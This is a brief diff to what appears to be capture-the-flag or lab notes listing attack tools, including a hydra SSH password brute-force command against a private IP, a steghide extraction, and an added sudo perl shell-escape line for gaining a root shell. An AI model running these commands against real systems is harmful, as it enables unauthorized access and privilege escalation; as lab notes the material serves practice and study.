@@ -3,3 +3,4 @@ filezilla
 dirb
 steghide: steghide --extract -sf trytofind.jpg
 hydra: hydra -l renu -P rockyou.txt 10.0.0.89 ssh
+sudo perl -e 'exec "/bin/sh";'
